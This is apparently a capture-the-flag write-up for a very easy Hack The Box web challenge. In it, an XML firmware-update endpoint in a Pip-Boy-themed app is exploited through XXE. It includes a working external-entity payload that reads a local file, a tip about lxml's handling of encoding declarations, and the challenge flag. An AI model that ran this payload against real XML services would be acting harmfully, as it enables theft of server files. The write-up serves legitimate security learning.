# Jailbreak

**Event:** HTB MCP TryOut · **Category:** web · **Points:** 1000 · **Difficulty:** very easy

## TL;DR

A Fallout-themed Pip-Boy SPA has a firmware-update endpoint that accepts XML. Classic XXE on `/api/update`. External entity pulls `/flag.txt` into a tag that gets echoed back in the success message.

## What I saw first

The name made me look for prompt-injection on an LLM endpoint. There is no LLM. The name is misdirection. The app has routes `/data`, `/inventory`, `/map`, `/radio`, `/rom`. The `/rom` route has a textarea and a Submit button that POSTs raw XML to `/api/update`.

## What I tried that did not work

First payload had `<?xml version="1.0" encoding="UTF-8"?>` at the top. Server rejected it with `Unicode strings with encoding declaration are not supported.` That is the canonical lxml error message when the parser receives a string instead of bytes and the string declares an encoding. The fix is to drop the declaration, not to fix the encoding.

## What worked

```xml
<!DOCTYPE root [
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&flag;</Version>
  </Firmware>
</FirmwareUpdateConfig>
```

Server processed the entity, substituted the file content into `<Version>`, and echoed the result back in the firmware-update success message.

## Flag

`HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_f6867ddc868a7a31aafeb8d9a8a6542e}`

## What this taught me

Read the description and the actual app, not the title. The title is allowed to lie. Also: `lxml` with a string input refuses encoding declarations. If a server returns that exact error message, strip the declaration and try again.
